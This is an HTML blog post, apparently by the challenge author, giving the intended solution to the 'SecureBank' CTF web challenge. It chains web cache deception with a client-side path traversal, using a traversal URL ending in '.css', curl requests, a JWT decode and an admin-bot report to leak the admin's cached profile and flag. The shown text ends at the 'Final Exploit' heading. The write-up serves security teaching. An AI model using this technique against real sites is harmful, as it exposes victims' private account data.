@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=blog/livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Snyk CTF SecureBank - Chaining Cache Deception &amp; CSPT for Account Takeover - My Personal Blog</title><meta name="Description" content="This is my personal blog"><meta property="og:url" content="http://localhost:1313/blog/posts/snyk_ctf_secure_bank/">
+  <meta property="og:site_name" content="My Personal Blog">
+  <meta property="og:title" content="Snyk CTF SecureBank - Chaining Cache Deception & CSPT for Account Takeover">
+  <meta property="og:description" content="Introduction I had the honor of being a challenge author for Fetch The Flag CTF 2026, organized by Snyk and HackingHub. I designed a web challenge called SecureBank, which was solved 34 times out of more than 1000 players by the end of the competition.
+Want to try it yourself? You can run the challenge locally before reading further: github.com/F0DH1L/snyk_ctf_2k26_chall">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-02-17T20:56:39+01:00">
+    <meta property="article:modified_time" content="2026-02-17T20:56:39+01:00">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Web Security">
+    <meta property="article:tag" content="My_challenges">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Snyk CTF SecureBank - Chaining Cache Deception & CSPT for Account Takeover">
+  <meta name="twitter:description" content="Introduction I had the honor of being a challenge author for Fetch The Flag CTF 2026, organized by Snyk and HackingHub. I designed a web challenge called SecureBank, which was solved 34 times out of more than 1000 players by the end of the competition.
+Want to try it yourself? You can run the challenge locally before reading further: github.com/F0DH1L/snyk_ctf_2k26_chall">
+<meta name="application-name" content="My Personal Blog">
+<meta name="apple-mobile-web-app-title" content="My Personal Blog">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/blog/posts/snyk_ctf_secure_bank/" /><link rel="prev" href="http://localhost:1313/blog/posts/cybears_ctf_web_file_manager/" /><link rel="stylesheet" href="/blog/css/style.min.css"><link rel="preload" href="/blog/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/blog/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/blog/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/blog/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Snyk CTF SecureBank - Chaining Cache Deception \u0026 CSPT for Account Takeover",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/blog\/posts\/snyk_ctf_secure_bank\/"
+        },"genre": "posts","keywords": "ctf, web security, my_challenges","wordcount":  1130 ,
+        "url": "http:\/\/localhost:1313\/blog\/posts\/snyk_ctf_secure_bank\/","datePublished": "2026-02-17T20:56:39+01:00","dateModified": "2026-02-17T20:56:39+01:00","license": "2025 F0DH1L","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "F0DH1L"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/blog/" title="My Personal Blog">F0DH1L Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/blog/posts/"> Posts </a><a class="menu-item" href="/blog/tags/"> Tags </a><a class="menu-item" href="/blog/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/blog/" title="My Personal Blog">F0DH1L Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/blog/posts/" title="">Posts</a><a class="menu-item" href="/blog/tags/" title="">Tags</a><a class="menu-item" href="/blog/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Snyk CTF SecureBank - Chaining Cache Deception & CSPT for Account Takeover</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/blog/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>F0DH1L</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2026-02-17">2026-02-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1130 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#exploring-the-application">Exploring the Application</a></li>
+    <li><a href="#vulnerability-1-web-cache-deception">Vulnerability 1, Web Cache Deception</a>
+      <ul>
+        <li><a href="#discovering-the-cached-endpoint">Discovering the Cached Endpoint</a></li>
+        <li><a href="#triggering-the-cache">Triggering the Cache</a></li>
+        <li><a href="#why-its-not-exploitable-alone">Why It&rsquo;s Not Exploitable Alone</a></li>
+      </ul>
+    </li>
+    <li><a href="#vulnerability-2-client-side-path-traversal-cspt">Vulnerability 2, Client-Side Path Traversal (CSPT)</a>
+      <ul>
+        <li><a href="#inspecting-the-frontend">Inspecting the Frontend</a></li>
+        <li><a href="#proof-of-concept">Proof of Concept</a></li>
+      </ul>
+    </li>
+    <li><a href="#chaining-the-bugs-full-exploit">Chaining the Bugs, Full Exploit</a>
+      <ul>
+        <li><a href="#the-core-idea">The Core Idea</a></li>
+        <li><a href="#step-by-step-exploitation">Step by Step Exploitation</a></li>
+      </ul>
+    </li>
+    <li><a href="#final-exploit">Final Exploit</a></li>
+    <li><a href="#key-takeaways">Key Takeaways</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="introduction">Introduction</h2>
+<p>I had the honor of being a challenge author for <strong>Fetch The Flag CTF 2026</strong>, organized by <strong>Snyk</strong> and <strong>HackingHub</strong>. I designed a web challenge called <strong>SecureBank</strong>, which was solved <strong>34 times</strong> out of more than 1000 players by the end of the competition.</p>
+<blockquote>
+<p><strong>Want to try it yourself?</strong> You can run the challenge locally before reading further: <a href="https://github.com/F0DH1L/snyk_ctf_2k26_chall" target="_blank" rel="noopener noreffer ">github.com/F0DH1L/snyk_ctf_2k26_chall</a></p></blockquote>
+<p><img
+        class="lazyload"
+        src="/blog/svg/loading.min.svg"
+        data-src="/blog/images/snyk_ctf_secure_bank/image.png"
+        data-srcset="/blog/images/snyk_ctf_secure_bank/image.png, /blog/images/snyk_ctf_secure_bank/image.png 1.5x, /blog/images/snyk_ctf_secure_bank/image.png 2x"
+        data-sizes="auto"
+        alt="/blog/images/snyk_ctf_secure_bank/image.png"
+        title="Challenge on the platform" /></p>
+<p>SecureBank is an online banking application that contains two seemingly harmless vulnerabilities. Neither one is exploitable in isolation, but chaining them together yields <strong>complete account takeover</strong> of the bank administrator. This article walks through the intended solution: combining a <strong>Client-Side Path Traversal (CSPT)</strong> with a <strong>Web Cache Deception</strong> flaw to leak the admin&rsquo;s sensitive profile data and the flag.</p>
+<hr>
+<h2 id="exploring-the-application">Exploring the Application</h2>
+<p>After registering an account, players land on a standard banking dashboard. The interface shows account information and, importantly, a <strong>&ldquo;Report Suspicious Activity to Bank Security&rdquo;</strong> button, a clear hint that an admin bot actively visits reported URLs, much like an XSS-bot scenario.</p>
+<p><img
+        class="lazyload"
+        src="/blog/svg/loading.min.svg"
+        data-src="/blog/images/snyk_ctf_secure_bank/image-1.png"
+        data-srcset="/blog/images/snyk_ctf_secure_bank/image-1.png, /blog/images/snyk_ctf_secure_bank/image-1.png 1.5x, /blog/images/snyk_ctf_secure_bank/image-1.png 2x"
+        data-sizes="auto"
+        alt="/blog/images/snyk_ctf_secure_bank/image-1.png"
+        title="Login page" />
+<img
+        class="lazyload"
+        src="/blog/svg/loading.min.svg"
+        data-src="/blog/images/snyk_ctf_secure_bank/image-2.png"
+        data-srcset="/blog/images/snyk_ctf_secure_bank/image-2.png, /blog/images/snyk_ctf_secure_bank/image-2.png 1.5x, /blog/images/snyk_ctf_secure_bank/image-2.png 2x"
+        data-sizes="auto"
+        alt="/blog/images/snyk_ctf_secure_bank/image-2.png"
+        title="Main dashboard" /></p>
+<hr>
+<h2 id="vulnerability-1-web-cache-deception">Vulnerability 1, Web Cache Deception</h2>
+<h3 id="discovering-the-cached-endpoint">Discovering the Cached Endpoint</h3>
+<p>Intercepting the authenticated API request that loads user profile data reveals the following exchange:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-http">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/api/profile/549384146d072a64</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">0q930pc949s2.ctfhub.io</span>
+</span></span><span class="line"><span class="cl"><span class="n">X-Auth-Token</span><span class="o">:</span> <span class="l">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">application/json</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="g">HTTP/1.1 200 OK
+</span></span></span><span class="line"><span class="cl"><span class="g">Server: nginx/1.28.0
+</span></span></span><span class="line"><span class="cl"><span class="g">Date: Tue, 17 Feb 2026 20:01:28 GMT
+</span></span></span><span class="line"><span class="cl"><span class="g">Content-Type: application/json
+</span></span></span><span class="line"><span class="cl"><span class="g">Content-Length: 97
+</span></span></span><span class="line"><span class="cl"><span class="g">Connection: keep-alive
+</span></span></span><span class="line"><span class="cl"><span class="g">X-Cache-Status: MISS
+</span></span></span><span class="line"><span class="cl"><span class="g">
+</span></span></span><span class="line"><span class="cl"><span class="g">{
+</span></span></span><span class="line"><span class="cl"><span class="g">  &#34;email&#34;: &#34;asdf@f.com&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="g">  &#34;flag&#34;: &#34;&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="g">  &#34;user_id&#34;: &#34;549384146d072a64&#34;,
+</span></span></span><span class="line"><span class="cl"><span class="g">  &#34;username&#34;: &#34;asdf&#34;
+</span></span></span><span class="line"><span class="cl"><span class="g">}</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/blog/svg/loading.min.svg"
+        data-src="/blog/images/snyk_ctf_secure_bank/image-3.png"
+        data-srcset="/blog/images/snyk_ctf_secure_bank/image-3.png, /blog/images/snyk_ctf_secure_bank/image-3.png 1.5x, /blog/images/snyk_ctf_secure_bank/image-3.png 2x"
+        data-sizes="auto"
+        alt="/blog/images/snyk_ctf_secure_bank/image-3.png"
+        title="Cache MISS on normal request" /></p>
+<p>The <code>X-Cache-Status: MISS</code> header tells us the response was <strong>not</strong> served from the cache. So far, nothing unusual.</p>
+<h3 id="triggering-the-cache">Triggering the Cache</h3>
+<p>With the profile endpoint in sight, I started experimenting, testing common cache deception techniques against it. One of the usual tricks paid off: appending a static-file extension (<code>.css</code>) to the API URL changes the caching behavior:</p>
+<ul>
+<li><code>Cache-Control</code> flips to <code>max-age=86400, public</code></li>
+<li>On a second request, <code>X-Cache-Status</code> becomes <strong>HIT</strong>, the reverse proxy is now serving a cached copy of the JSON response.</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/blog/svg/loading.min.svg"
+        data-src="/blog/images/snyk_ctf_secure_bank/image-4.png"
+        data-srcset="/blog/images/snyk_ctf_secure_bank/image-4.png, /blog/images/snyk_ctf_secure_bank/image-4.png 1.5x, /blog/images/snyk_ctf_secure_bank/image-4.png 2x"
+        data-sizes="auto"
+        alt="/blog/images/snyk_ctf_secure_bank/image-4.png"
+        title="Cache HIT after appending .css" /></p>
+<p>This is a textbook <strong>Web Cache Deception</strong> issue: the reverse proxy decides to cache a response based purely on the URL extension, ignoring the actual <code>Content-Type</code>, backend cache directives, and authentication requirements.</p>
+<h3 id="why-its-not-exploitable-alone">Why It&rsquo;s Not Exploitable Alone</h3>
+<p>At first glance, this looks devastating, but there is a catch. The API authenticates requests via a custom <code>X-Auth-Token</code> header. <strong>Browsers do not attach custom headers to regular navigations.</strong> If an attacker simply sends a victim a link to <code>/api/profile/victim_id.css</code>, the browser visits it without the token, the backend returns <code>401 Unauthorized</code>, and the CDN caches an error, useless.</p>
+<p>To weaponize this, we need a way to <strong>force the victim&rsquo;s browser to issue an authenticated request</strong> to the cacheable endpoint.</p>
+<hr>
+<h2 id="vulnerability-2-client-side-path-traversal-cspt">Vulnerability 2, Client-Side Path Traversal (CSPT)</h2>
+<h3 id="inspecting-the-frontend">Inspecting the Frontend</h3>
+<p>Reviewing the source of the profile page reveals how the client fetches user data:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-javascript">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">loadUserProfile</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">urlParams</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">userId</span> <span class="o">=</span> <span class="nx">urlParams</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;userId&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">userId</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">showError</span><span class="p">(</span><span class="s1">&#39;No account ID provided&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">apiUrl</span> <span class="o">=</span> <span class="sb">`http://</span><span class="si">${</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">host</span><span class="si">}</span><span class="sb">/api/profile/</span><span class="si">${</span><span class="nx">userId</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="nx">apiUrl</span><span class="p">,</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;GET&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">headers</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;X-Auth-Token&#39;</span><span class="o">:</span> <span class="nx">authToken</span><span class="p">,</span>  
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;Accept&#39;</span><span class="o">:</span> <span class="s1">&#39;application/json&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;Accept-Encoding&#39;</span><span class="o">:</span> <span class="s1">&#39;gzip, deflate, br&#39;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">});</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">displayUserData</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">showError</span><span class="p">(</span><span class="s1">&#39;Failed to load account data&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>The <code>userId</code> query parameter is concatenated directly into the API URL with <strong>zero validation</strong>. Because the resulting string is passed to <code>fetch()</code>, which automatically normalizes directory-traversal sequences, an attacker can redirect the request to an arbitrary same-origin path.</p>
+<h3 id="proof-of-concept">Proof of Concept</h3>
+<p>Visiting the following URL confirms the traversal:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>http://localhost:1337/profile?userId=../../api/profile/a1b2c3d4</code></pre></div>
+<p>The JavaScript constructs <code>/api/users/info/../../api/profile/a1b2c3d4</code>, which the browser normalizes to <code>/api/profile/a1b2c3d4</code>. The request goes out <strong>with the victim&rsquo;s <code>X-Auth-Token</code> header attached</strong>, and the API responds normally.</p>
+<p><img
+        class="lazyload"
+        src="/blog/svg/loading.min.svg"
+        data-src="/blog/images/snyk_ctf_secure_bank/image-5.png"
+        data-srcset="/blog/images/snyk_ctf_secure_bank/image-5.png, /blog/images/snyk_ctf_secure_bank/image-5.png 1.5x, /blog/images/snyk_ctf_secure_bank/image-5.png 2x"
+        data-sizes="auto"
+        alt="/blog/images/snyk_ctf_secure_bank/image-5.png"
+        title="CSPT working, authenticated request redirected" /></p>
+<p>On its own, this CSPT doesn&rsquo;t accomplish much, the attacker can only redirect the victim&rsquo;s request to other endpoints on the same origin. But combined with the cache deception finding, it becomes the missing piece of the puzzle.</p>
+<hr>
+<h2 id="chaining-the-bugs-full-exploit">Chaining the Bugs, Full Exploit</h2>
+<h3 id="the-core-idea">The Core Idea</h3>
+<table>
+  <thead>
+      <tr>
+          <th>Vulnerability</th>
+          <th>What it provides</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>CSPT</strong></td>
+          <td>Control over the path of an <strong>authenticated</strong> <code>fetch()</code> request</td>
+      </tr>
+      <tr>
+          <td><strong>Cache Deception</strong></td>
+          <td>Any request to a URL ending in <code>.css</code> is cached <strong>publicly</strong> by the CDN</td>
+      </tr>
+  </tbody>
+</table>
+<p>By injecting a traversal payload that ends in <code>.css</code>, the CSPT forces the victim&rsquo;s browser to make an <strong>authenticated request to a cacheable URL</strong>. The CDN then stores the response, making the victim&rsquo;s private data accessible to anyone.</p>
+<h3 id="step-by-step-exploitation">Step by Step Exploitation</h3>
+<p><strong>1. Register an attacker account</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -X POST http://localhost:1337/api/register <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -H <span class="s2">&#34;Content-Type: application/json&#34;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl"><span class="se"></span>  -d <span class="s1">&#39;{&#34;username&#34;:&#34;attacker123&#34;,&#34;email&#34;:&#34;attacker@evil.com&#34;,&#34;password&#34;:&#34;password123&#34;}&#39;</span></span></span></code></pre></div></div>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-json">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;success&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;auth_token&#34;</span><span class="p">:</span> <span class="s2">&#34;eyJhbGc...&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;attacker123&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p><strong>2. Decode the JWT to obtain the user ID</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">jwt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">token</span> <span class="o">=</span> <span class="s2">&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">options</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;verify_signature&#34;</span><span class="p">:</span> <span class="kc">False</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="s2">&#34;user_id&#34;</span><span class="p">])</span>  </span></span></code></pre></div></div>
+<p><strong>3. Craft the malicious URL</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>http://localhost:1337/profile?userId=../../api/profile/a1b2c3d4e5f6.css</code></pre></div>
+<p>When the victim visits this link, the following chain fires:</p>
+<ol>
+<li>The profile page loads and reads the <code>userId</code> query parameter.</li>
+<li>JavaScript constructs the API URL: <code>/api/users/info/../../api/profile/a1b2c3d4e5f6.css</code></li>
+<li>The browser normalizes it to: <code>/api/profile/a1b2c3d4e5f6.css</code></li>
+<li><code>fetch()</code> sends the request <strong>with the victim&rsquo;s auth token</strong>.</li>
+<li>The backend returns the victim&rsquo;s profile JSON.</li>
+<li>The CDN sees a <code>.css</code> URL and <strong>caches the response publicly</strong>.</li>
+</ol>
+<p><strong>4. Report the URL to the admin</strong></p>
+<p>Using the in-app reporting feature, submit the crafted URL. The admin bot visits it with an authenticated session, triggering the CSPT → Cache Deception chain.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>GET /api/profile/a1b2c3d4e5f6.css
+X-Auth-Token: &lt;ADMIN_TOKEN&gt;</code></pre></div>
+<p>The admin&rsquo;s profile data is now cached.</p>
+<p><strong>5. Retrieve the cached data</strong></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://localhost:1337/api/profile/a1b2c3d4e5f6.css</span></span></code></pre></div></div>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-json">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;user_id&#34;</span><span class="p">:</span> <span class="s2">&#34;admin_id_xyz&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;Administrator&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;email&#34;</span><span class="p">:</span> <span class="s2">&#34;admin@securebank.com&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;flag&#34;</span><span class="p">:</span> <span class="s2">&#34;flag{cache_deception_with_cspt_gadget_thats_absolute_cinema}&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>No authentication required, the CDN happily serves the cached admin data.</p>
+<hr>
+<h2 id="final-exploit">Final Exploit</h2>
+<p>The full exploit script automates every step: registration, login, URL reporting, and flag retrieval.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
